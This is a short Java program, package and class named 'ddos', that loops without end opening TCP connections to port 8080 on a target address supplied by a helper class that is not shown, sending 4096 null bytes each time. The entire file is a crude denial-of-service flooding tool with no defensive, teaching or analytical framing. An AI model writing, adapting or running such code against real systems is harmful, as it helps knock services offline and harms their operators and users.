package ddos;
import java.io.*;
import java.net.*;

public class ddos {

	
	public static void main(String[] args) {
	inetip ip = new inetip();
	
		try{
			
		
			while(true){
			byte[] a = new byte[4096];
		Socket s=new Socket(ip.inetid(),8080);
		
		DataOutputStream dout=new DataOutputStream(s.getOutputStream());
		
		dout.write(a);
		dout.flush();
		s.close();
			}
		}catch(Exception ex){
			System.out.println(ex);
		}
		
		}
	}


